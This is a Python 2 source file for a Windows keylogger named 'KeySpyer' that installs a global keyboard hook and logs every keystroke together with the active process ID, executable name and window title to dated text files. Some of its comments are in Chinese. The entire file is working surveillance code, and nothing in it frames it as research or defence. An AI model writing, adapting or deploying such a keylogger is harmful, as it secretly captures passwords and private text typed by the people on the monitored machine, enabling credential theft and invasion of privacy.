# coding:utf-8
import sys
from ctypes import *
import pythoncom
import pyHook
import time
import os
import win32api
import threading
import  Queue
from urllib import quote
import win32clipboard



class KeySpyer(threading.Thread):

    KEY_MAP = {
        187: "+",
        189: "-",
        190: ".",
        188: ",",
        37: "←",
        38: "↑",
        39: "→",
        40: "↓",
        20: "[CAP]",
        13: "[Enter]",
        162: "[ALT]",
        160: "[shift]",
        8: "[Del]",
        9: "[Tab]",
        219: "【",
        221: "】",
        220: "\\",
        192: "`",
        32: " ",
        186:":",
        222: "'",
        191: "/",
    }

    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.window = None
        self.status = False
        self.keyboard_file_path = "./log/keyboard/"
        self.manager = None
        self.queue = queue
        self.data = {}

    def run(self):
        self.status = True
        self.manager = pyHook.HookManager()
        self.manager.KeyDown = self.onkeyboardevent
        self.manager.HookKeyboard()
        pythoncom.PumpMessages()

    def savedata(self):
        self.queue.put(self.data)
        local_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        data_file_name = local_time[:local_time.find(" ")] + ".txt"

        if not os.path.exists(self.keyboard_file_path):
            os.makedirs(self.keyboard_file_path)

        if not os.path.exists(self.keyboard_file_path + data_file_name):
            f = open(self.keyboard_file_path + data_file_name, "w")
            f.write("localTime            PID              executable            windowName                  keys\n")
            f.close()
        # note4
        f = open(self.keyboard_file_path + data_file_name, 'a')
        f.write("%s||%s||%s||%s||%s\n\r" % (self.data["time"], self.data['proces_id'], self.data['executable'], self.data['windowName'], self.data['text']))
        f.close()

        self.data = {}

    # 定义监听键盘事件函数
    def onkeyboardevent(self, event):
        '''
            监听键盘事件
        '''

        # 获取最上层的窗口句柄
        hwnd = windll.user32.GetForegroundWindow()
        # 获取进程ID
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))

        # 将进程ID存入变量中
        process_id = "%d" % pid.value

        if self.window != process_id:
            if self.window:

                if self.status:
                    # 列表list
                    # str.find()返回的是匹配的第一个字符串的位置
                    # time keyvalue Key WindowName

                    if type(event.WindowName) == str:
                        self.savedata()
            # 读取程序运行时间
            self.data['time'] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())

            # 申请内存
            executable = create_string_buffer("\x00"*512)
            h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
            windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

            # 读取窗口标题
            windows_title = create_string_buffer("\x00"*512)
            length = windll.user32.GetWindowTextA(hwnd, byref(windows_title), 512)

            self.window = process_id
            self.data['proces_id'] = process_id
            self.data['executable'] = executable.value
            self.data['windowName'] = event.WindowName
            self.data['text'] = ""
        # print event.WindowName.decode("gbk").encode("utf-8"), quote(event.WindowName.decode("gbk").encode("utf-8"))
        if event.KeyID > 32 and event.KeyID <= 90:
            self.data['text'] += event.Key
        else:
            self.data['text'] += self.KEY_MAP.get(event.KeyID, "[%s]" % (event.Key,))

        # print self.KEY_MAP.get(event.KeyID, event.Key), event.Key, event.KeyID
        # Key = F7
        if event.KeyID == 118:
            self.status = False
        # Key = F4
        if event.KeyID == 115:
            self.status = True
        # print event.KeyID
        # 同鼠标监听事件函数的返回值
        return True

    def destory(self):
        self.status = False
        win32api.PostQuitMessage()

if __name__ == "__main__":
    queue = Queue.Queue(100)
    spyer = KeySpyer(queue)
    spyer.start()
